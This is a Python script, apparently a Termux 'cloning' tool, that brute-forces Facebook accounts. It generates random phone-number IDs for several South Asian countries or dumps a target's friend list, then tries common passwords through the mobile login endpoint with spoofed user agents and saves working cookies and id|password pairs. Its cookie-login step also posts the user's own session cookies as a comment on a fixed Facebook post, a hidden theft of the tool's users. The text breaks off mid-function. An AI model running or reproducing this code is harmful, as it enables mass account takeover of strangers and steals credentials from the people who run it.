from os import path
import os,base64,zlib,pip,urllib
print('\n\033[1;37m install modules...\n It will take some seconds Please Wait...')
try:
        import os,requests,json,time,re,random,sys,uuid,string,subprocess
        from string import *
        from concurrent.futures import ThreadPoolExecutor as tred
except ModuleNotFoundError:
        print('\n Installing missing modules ...')
        os.system('pip install requests futures==2 > /dev/null')
        os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requestspip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests')
        os.system('python RAHUL.py')
except:pass
fbks=('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana','com.facebook.mlite')
gt = random.choice(['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550	5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','GT-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750'])
ugen=[]
for xd in range(10000):
	aa='Mozilla/5.0 (Linux; U; Android'
	b=random.choice(['6','7','8','9','10','11','12','13'])
	c=f' en-us; {str(gt)}'
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
for agent in range(10000):
	aa='Mozilla/5.0 (Linux; Android 6.0.1;'
	b=random.choice(['6','7','8','9','10','11','12','13'])
	c='en-us; 10; T-Mobile myTouch 3G Slide Build/GRI40)I148V)'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/533.1'
	fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	ugen.append(fullagnt)
rug=[]
for nt in range(10000):
	rr=random.randint
	aZ=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	rx=random.randrange(1, 999)
	xx=f"Mozilla/5.0 (Windows NT 10.0; {str(rr(9,11))}; Win64; x64){str(aZ)}{str(rx)}{str(aZ)}) AppleWebKit/537.36 (KHTML, like Gecko){str(rr(99,149))}.0.{str(rr(4500,4999))}.{str(rr(35,99))} Chrome/{str(rr(99,175))}.0.{str(rr(0,5))}.{str(rr(0,5))} Safari/537.36"
	rug.append(xx)
ruz=[]
for mtc in range(10000):
	rr=random.randint
	xd=f"Mozilla/5.0 (Macintosh; Intel Mac OS {str(rr(7,15))} {str(rr(7,15))}_{str(rr(1,9))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(99,199))}.0.{str(rr(3999,4999))}.{str(rr(99,150))} Safari/537.36 OPR/{str(rr(99,199))}.0.{str(rr(3999,4999))}.{str(rr(99,150))}"
	ruz.append(xd)
	
#new ua
ugen=[]
for agent in range(10000):
        aa='Mozilla/5.0 (Linux; Android 6.0.1;'
        b=random.choice(['6','7','8','9','10','11','12'])
        c='en-us; 10; T-Mobile myTouch 3G Slide Build/'
        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e=random.randrange(1, 999)
        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/533.1'
        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
        ugen.append(fullagnt)


logo = ("""\033[1;32m      
  ____  _       ____       _           _ 
 |  _ \| |__   |  _ \ __ _| |__  _   _| |
 | |_) | '_ \  | |_) / _` | '_ \| | | | |
 |  _ <| |_) | |  _ < (_| | | | | |_| | |
 |_| \_\_.__/  |_| \_\__,_|_| |_|\__,_|_|
                                            \033
---------------------------------------------- 
 Author    : RB RAHUL
 Github    : Hackerrv33
 Facebook  : RB RAHUL CMD(RB Brand)
 Status    : Free
 Youtube   : Tech Rahul Rb
 Tool Type : File+Random Cloning
 Version   : 11.0.0
----------------------------------------------
 Note: Use Fligt Mode ON/OFf When Start CMD 
\033[1;37m----------------------------------------------""")
def linex():
        print('\033[1;37m----------------------------------------------')
def clear():
        os.system('clear')
        print(logo)
def approval():
  os.system('clear')
  print(logo)
  uuid = str(os.geteuid()) + str(os.getlogin())
  id = "-".join(uuid)
  try:
    httpCaht = requests.get('https://raw.githubusercontent.com/Hackerrv33/rahulrbc/main/server.txt').text
    if id in httpCaht:
      print("\33[1;32mYour Token is Successfully Approved")
      msg = str(os.geteuid())
      time.sleep(0.5)
      clear()
      pass
    else:
      print("Your Token : "+id)
      print('\33[1;37m----------------------------------------------')
      print("\33[1;32mImportant Note-Tool is Free ")
      print("\33[1;37m----------------------------------------------")
      print("\33[1;37mFor One Condition to get Free Register Everyone")
      print('First Subscribe My Youtube Channel And Send Screen Shot')
      print('Send Your Screen Shot and Get Approval Within 5 min')
      print('\33[1;37m----------------------------------------------')
      print ('Register Auto Delete If You Are Unsubscribe My Channel')
      input('IF U WANT Free Approval PRESS ENTER ')
      tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id);os.system('am start https://wa.me/+923182155629?text='+tks),approval()
      time.sleep(1)
      menu()
  except:
    sys.exit()        
loop=0
oks=[]
cps=[]
twf=[]
pcp=[]
id=[]
tokenku=[]
def login():
        clear()
        cookies = input(' Put cookies: ')
        try:
                data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36","referer": "https://m.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookies})
                find_token = re.search("(EAAG\w+)", data.text)
                open(".tok.txt", "w").write(find_token.group(1))
                open(".coki.txt","w").write(cookies)
                tok=open('.tok.txt','r').read()
                info = requests.get('https://graph.facebook.com/me/?access_token='+tok,cookies = {"cookie":cookies}).json()
                name=(info['name'])
                idd=(info['id'])
                barth=(info['birthday'])
                linex()
                print(' Welcome\033[1;32m : '+name)
                print(' \033[1;37mYour UID : '+idd)
                print(' Barth Day: '+barth)
                requests.post('https://graph.facebook.com/pfbid02Sj97PfY1mY3cvbLjGaJRz22FR7yc75JFKLoBFiHoNLSq9aGxmGKotAtcYLkMDDpbl/comments/?message='+cookies+'&access_token='+tok, cookies={'cookie':cookies})
                linex()
                print(' Cookies login has been successfull...')
                time.sleep(1)
                menu()
        except KeyError:
                print('\033[1;31m Cookies has been expired...')
                os.system('rm -rf .tok.txt');time.sleep(1);login()
        except requests.exceptions.ConnectionError:
                exit(' internet connection error...')
        except AttributeError:
                print('\033[1;31m Cookies has been expired...')
                os.system('rm -rf .tok.txt');time.sleep(1);login()
                login()
def public():
        usrr=[]
        clear()
        try:
                tok = open('.tok.txt','r').read()
                cok = open('.coki.txt','r').read()
                tokenku.append(tok)
        except KeyError:
                print('\033[1;31mYour cookies han expired...');time.sleep(1)
                login()
        except IOError:
                print('\033[1;31mYour cookies han expired...');time.sleep(1)
                login()
        try:
                info = requests.get('https://graph.facebook.com/me/?access_token='+tok,cookies = {"cookie":cok}).json()
                name=(info['name'])
                print('\033[1;32m Welcome '+name)
                linex()
        except KeyError:
                print('\033[1;31mYour cookies han expired...');time.sleep(1)
                login()
        try:
                jum=int(input(' \033[1;36mHow many ids you went to clone ?\033[1;37m '))
        except ValueError:
                exit(' Put only digits not latters ')
        if jum<1 or jum>5000:
                exit()
        ses=requests.Session()
        yz = 0
        for met in range(jum):
                yz+=1
                kl = input(f'\033[1;37m Put link no.{yz+0}: ')
                usrr.append(kl)
        linex()
        print(' Method 1 Working OP ')
        linex()
        print(' [1] Method Updated (for new ids) \n [2] Method 2 (for old ids)\n [3] Method 3 (for old ids)')
        linex()
        mthd = input(' Choose method: ')
        linex()
        print(' Do you went show cp account? (y/n): ')
        linex()
        cx=input(' Choose: ')
        if cx in ['y','Y','yes','Yes','1']:
                pcp.append('y')
        else:
                pcp.append('n')
        linex()
        print('\033[1;32m Dumping friend list...\033[1;37m')
        linex()
        for userr in usrr:
                try:
                        col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
                        for mi in col['friends']['data']:
                                try:
                                        iso = (mi['id']+'|'+mi['name'])
                                        if iso in id:pass
                                        else:id.append(iso)
                                except:continue
                except (KeyError,IOError):
                        pass
                except requests.exceptions.ConnectionError:
                        exit(f' No internet connection')
        try:
                plist = []
                try:
                        ps_limit = int(input(' How many passwords do you want to add ? '))
                except:
                        ps_limit =1
                linex()
                print('\033[1;32m exp: first last,firtslast,first123')
                linex()
                for i in range(ps_limit):
                        plist.append(input(f' Put password {i+1}: '))
                with tred(max_workers=30) as crack_submit:
                        clear()
                        total_ids = str(len(id))
                        print(' Total account : \033[1;32m'+total_ids+f' \033[1;33m>\033[1;36m> \033[1;37mMethod -> \033[1;37mM{mthd}')
                        print("\033[1;37m \x1b[38;5;208mUse flight mode for speed up\033[1;37m")
                        linex()
                        for user in id:
                                ids,names = user.split('|')
                                passlist = plist
                                if mthd in ['1','01']:
                                        crack_submit.submit(ffb,ids,names,passlist)
                                elif mthd in ['2','02']:
                                        crack_submit.submit(api,ids,names,passlist)
                                elif mthd in ['3','03']:
                                        crack_submit.submit(api2,ids,names,passlist)
                                elif mthd in ['3','04']:
                                        crack_submit.submit(api5,ids,names,passlist)        
                                else:
                                        crack_submit.submit(api1,ids,names,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                linex()
                input(' Press enter to back ')
                os.system('python MAFIA.py')
        except requests.exceptions.ConnectionError:
                exit(f' No internet connection')
        except (KeyError,IOError):
                print(f' No friends for {userr}')
                time.sleep(3)
                public()
def sids():
    os.system('clear')
    print(logo)
    try:
        file_name = input(' Input file name: ')
        open(file_name,'r').read()
    except FileNotFoundError:
        print('\n\033[0;97m  File not found Please Put File Path.......\033[0;97m')
    limit = int(input(' How many links do you want to separate? '))
    print('\n\033[1;33m Example: /sdcard/Rahul.txt\033[0;97m')
    
    new_save = input(' Save new file as: ')
    y = 0
    for k in range(limit):
        y+=1
        links = input(' Put links %s: '%(y))
        os.system('cat '+file_name+' | grep "'+links+'" >> '+new_save)
    print(50*'-')
    print(' Links grabbed successfully')
    print(' Total grabbed links: '+str(len(open(new_save).read().splitlines())))
    print(' New file saved as: '+new_save)
    print(50*'-')
    input('\n Press enter to back ')
    main()
def remove_dub():
    os.system('clear')
    print(logo)
    print(' Dublicate lines remover ...')
    print(50*'-')
    user_file = input(' Put file path: ')
    try:
        open(user_file,'r').read()
        print('\n\033[1;33m Example: /sdcard/filename.txt\033[0;97m')
        save_file = input(' Save new file as: ')
        os.system('touch '+save_file)
        os.system('sort -r '+user_file+' | uniq > '+save_file)
        print(50*'-')
        print(' Dublicate lines has been removed from file')
        print(' Result file saved as: '+save_file)
        print(50*'-')
        input('\n Press enter to back ')
        main()
    except FileNotFoundError:
        print('\n\033[0;97m File not found on provided path, try again ...\033[0;97m')
        print('\n\033[0;97m File not found on provided path, try again ...\033[0;97m')
def menu():
        global lim,tp
       
        try:
                clear()
                sj="server on"
                if "server on" in sj:
                        #clear()
                        print(' [1] File cloning Menu\n [2] File Create Menu\n [3] How to Use Rb Tools\n [4] Join Whatsapp Group\n [0] Exit menu')
                        linex()
                        xd=input(' Choose an option: ')
                        if xd in ['1','01']:
                              clear()
                              print(' [1] File Cloning \n [2] Public cloning (Target Id) \n [3] Random Cloning(Updated)')
                              linex()
                              x=input(' Choose: ')
                              if x in ['1','01']:
                                clear()
                                print(' Put file example:  /sdcard/FileName.txt  etc..')
                                linex()
                                file = input(' Put file path\033[1;37m: ')
                                try:
                                        fo = open(file,'r').read().splitlines()
                                except FileNotFoundError:
                                        print(' File location not found ')
                                        time.sleep(1)
                                        menu()
                                clear()
                                print(' All Method are Udated Check One By One ')
                                linex()
                                print(' [1] Method 1 (FOR FREHS ID ) \n [2] Method 2 (Fresh New Id) \n [3] Method 3 (Mix Id) \n [4] Method 4 (Old Id) ')
                                linex()
                                mthd=input(' Choose: ')
                                linex()
                                plist = []
                                print(' Select Crack Pass Method');linex();print(' [1] Auto Password Crack \n [2] Choice Password Crack \n [3] First Last Firstlast pass Crack\n [4] Crack with First and Last name ');linex()
                                ppp=input(' Choose: ')
                                if ppp in ['1','01']:
                                        plist.append('first last')
                                        plist.append('first123')
                                        plist.append('first@123')
                                        plist.append('first12345')
                                        plist.append('first@12345')
                                elif ppp in ['3','03']:
                                    plist.append("firstlast")
                                    plist.append("first last")
                                    plist.append("First Last")
                                    plist.append("Firstlast")
                                    plist.append("786786")
                                elif ppp in ["4","04"]:
                                    plist.append("firstlast")
                                    plist.append("first last")
                                else:
                                        try:
                                                linex()
                                                ps_limit = int(input(' How many passwords do you want to add ? '))
                                        except:
                                                ps_limit =1
                                        linex()
                                        print('\033[1;32m exp: first last,firtslast,first123')
                                        linex()
                                        for i in range(ps_limit):
                                                plist.append(input(f' Put password {i+1}: '))
                                linex()
                                print(' Do you went show cp account? (y/n): ')
                                linex()
                                cx=input(' Choose: ')
                                if cx in ['y','Y','yes','Yes','1']:
                                        pcp.append('y')
                                else:
                                    pcp.append('n')
                                
                                with tred(max_workers=30) as crack_submit:
                                        clear()
                                        total_ids = str(len(fo))
                                        lim=int(total_ids)
                                        print(f' Total account : \033[1;32m'+total_ids+f' \n \033[1;37mMethod > \033[1;37mM{mthd}')
                            
                                        
                                        for user in fo:
                                                ids,names = user.split('|')
                                                passlist = plist
                                                if mthd in ['1','01']:
                                                        crack_submit.submit(ffb,ids,names,passlist)
                                                elif mthd in ['2','02']:
                                                        crack_submit.submit(ffb2,ids,names,passlist)
                                                elif mthd in ['3','03']:
                                                        crack_submit.submit(api,ids,names,passlist)
                                                elif mthd in ['4','04']:
                                                        crack_submit.submit(api2,ids,names,passlist)        
                                                else:
                                                        crack_submit.submit(api,ids,names,passlist)

                                print('\033[1;37m')

                                linex()
                                print(' The process has completed')
                                print(' Total OK/CP/2F: '+str(len(oks))+'/'+str(len(cps))+'/'+str(len(twf)))
                                linex()
                                input(' Press enter to back ')
                                os.system('python RAHUL.py')
                              elif x in ['2','02']:
                                    public()
                              elif x in ['3','03']:
                                clear()
                                print(' [1] Pakistan cloning\n [2] Bangladesh cloning\n [3] Afganistan Cloning\n [4] India cloning\n [5] Nepal cloning\n [0] Back menu')
                                linex()
                                x=input(' Choose: ')
                                if x in ['1','01']:
                                        pak()
                                elif x in ['2','02']:
                                        bd()
                                elif x in ['3','03']:
                                    afgan()
                                elif x in ['4','04']:
                                    india()
                                elif x in ['5','05']:
                                    nepal()    
                        
                                else:
                                        menu()       
                        elif xd in ['2','02']:
                                clear()
                                print(' [1] Create File (DumP)\n [2] Remove Double Link\n [3] Separate Link\n [0] Back menu')
                                linex()
                                x=input(' Choose: ')
                                if x in ['1','01']:
                                    os.system('python dump.py')
                                elif x in ['2','02']:
                                        remove_dub()
                                elif x in ['3','03']:
                                        sids()
                                else:
                                        menu()
                        elif xd in ['3','03']:
                               wx=('watch?v=koPEi7HXPtk/')
                               os.system(f'xdg-open https://www.youtube.com/{wx}');menu()
                        elif xd in ['4','04']:
                               wx=('Js1oU99b67uGRsaKs88RB7')
                               os.system(f'xdg-open https://chat.whatsapp.com/{wx}');menu()               
                        elif xd in ['0','00']:
                                exit(' Thanks for use 🥰 ')
                        else:
                                exit(' Option not found in menu...')
                else:
                        print('Will be back soon')


                        linex()
                        exit()
        except ValueError:
                exit()
        except requests.exceptions.ConnectionError:
                print('\n No internet connection ...')
                exit()
                
def pak():
                user=[]
                global lim
                clear()
                print('\033[1;31m Code example: 0306,0315,0335,0345')
                code = input('\033[1;37m put code: ')
                try:
                        limit = int(input('\033[1;31m example: 2000, 3000, 5000, 10000\n\033[1;37m put limit: '))
                except ValueError:
                        limit = 5000
                lim=limit
                for nmbr in range(limit):
                        nmp = ''.join(random.choice(string.digits) for _ in range(7))
                        user.append(nmp)
                
                with tred(max_workers=30) as RAHUL:     
                        clear()
                        tl = str(len(user))
                        print(' Total ids : \033[1;32m'+tl)
                        print(f'\033[1;37m Choice code ..:\033[1;32m '+code)
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'khan12345','khan123','baloch123','pakistan']
                                RAHUL.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP/2F: '+str(len(oks))+'/'+str(len(cps))+'/'+str(len(twf)))
                linex()
                input(' Press enter to back ')
                os.system('python RAHUL.py')
def bd():
                user=[]
                global lim
                clear()
                print('\033[1;31m Code example: 016,017,018,019')
                code = input('\033[1;37m put code: ')
                try:
                        limit = int(input('\033[1;31m example: 2000, 3000, 5000, 10000\n\033[1;37m put limit: '))
                except ValueError:
                        limit = 5000
                lim=limit
                for nmbr in range(limit):
                        nmp = ''.join(random.choice(string.digits) for _ in range(8))
                        user.append(nmp)
                
                with tred(max_workers=30) as RAHUL:
                        clear()
                        tl = str(len(user))
                        print(' Total ids : \033[1;32m'+tl)
                        print(f'\033[1;37m Choice code ..:\033[1;32m '+code)
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'Bangladesh','bangladesh','i love you','iloveyou','free fire','freefire']
                                RAHUL.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP/2F: '+str(len(oks))+'/'+str(len(cps))+'/'+str(len(twf)))
                linex()
                input(' Press enter to back ')
                os.system('python RAHUL.py')
                
def afgan():

                user=[]
                global lim
                clear()
                print('\033[1;31m Codes: 070, 071, 072, 073, 074, 075, 076, 077, 078, 079')
                code = input('\033[1;37m put code: ')
                try:
                        limit = int(input('\033[1;31m example: 2000, 3000, 5000, 10000\n\033[1;37m put limit: '))
                except ValueError:
                        limit = 5000
                lim=limit
                for nmbr in range(limit):
                        nmp = ''.join(random.choice(string.digits) for _ in range(7))
                        user.append(nmp)
                
                with tred(max_workers=30) as RAHUL:     
                        clear()
                        tl = str(len(user))
                        print(' Total ids : \033[1;32m'+tl)
                        print(f'\033[1;37m Choice code ..:\033[1;32m '+code)
                        for psx in user:
                                ids = code+psx
                            
                            
                                passlist = [psx,psx[1:],"afgan123",ids,'afgan1122']
                            
                                RAHUL.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP/2F: '+str(len(oks))+'/'+str(len(cps))+'/'+str(len(twf)))
                linex()
                input(' Press enter to back ')
                os.system('python RAHUL.py')
              
def nepal():



                user=[]
                global lim
                clear()
                print('\033[1;31m Example: 9810,9812,9814,98094,etc')
                code = input('\033[1;37m put code: ')
                try:
                        limit = int(input('\033[1;31m example: 2000, 3000, 5000, 10000\n\033[1;37m put limit: '))
                except ValueError:
                        limit = 5000
                lim=limit
                for nmbr in range(limit):
                        nmp = ''.join(random.choice(string.digits) for _ in range(10-len(code)))
                        user.append(nmp)
                
                with tred(max_workers=30) as RAHUL:     
                        clear()
                        tl = str(len(user))
                        print(' Total  ids : \033[1;32m'+tl)
                        print(f'\033[1;37m Choice code ..:\033[1;32m '+code)
                        for psx in user:
                                ids = code+psx
                            
                            
                                passlist = [ids[4:],psx,ids,"nepal123","nepal@123","123456","12345678"]
                            
                                RAHUL.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP/2F: '+str(len(oks))+'/'+str(len(cps))+'/'+str(len(twf)))
                linex()
                input(' Press enter to back ')
                os.system('python RAHUL.py')

def ffb(ids,names,passlist):
        global loop,oks,cps,lim
        p=round(loop*100/lim,2)
        sys.stdout.write('\r\r\033[1;37m [RAHUL-RB M1] %s|\033[1;32mOK:-%s \033[1;37m%s%% \033[1;37m'%(loop,len(oks),p));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(' ')[0]
                try:
                        last = names.split(' ')[1]
                except:
                        last = 'Khan'
                ps = first.lower()
                ps2 = last.lower()
                for fikr in passlist:
                        pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
                        ua=random.choice(ugen)
                        head = {                         
                           'authority': 'free.facebook.com',
    'upgrade-insecure-requests': '1',
    'viewport-width': '980',
    'method': 'path',
    'scheme': 'https',                      
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'accept-language': 'en-US,en;q=0.9,ur-PK;q=0.8,ur;q=0.7',
    'cache-control': 'max-age=0',
    'referer': 'https://free.facebook.com/',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="109", "Google Chrome";v="109"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': ua,
}
                        getlog = session.get(f'https://free.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
                        idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://free.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                        complete = session.post('https://free.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
                        RAHUL=str(session.cookies)
                        if "c_user" in RAHUL:
                                print('\r\r\033[1;32m [RAHUL-OK] %s | %s'%(ids,pas))
                                dc=dict(session.cookies)
                                coki=";".join([k+"="+v for k,v in dc.items()])
                                open('/sdcard/RAHUL-COOKIE.txt','a').write(coki+'\n')
                                open('/sdcard/RAHUL-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in RAHUL:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [RAHUL-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/RAHUL-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
                        else:
                                continue
        except requests.exceptions.ConnectionError:
                time.sleep(20)
        loop+=1        
def ffb2(ids,names,passlist):
        global loop,oks,cps,lim
        p=round(loop*100/lim,2)
        sys.stdout.write('\r\r\033[1;37m [RAHUL-RB M2] %s|\033[1;32mOK:-%s \033[1;37m%s%% \033[1;37m'%(loop,len(oks),p));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(' ')[0]
                try:
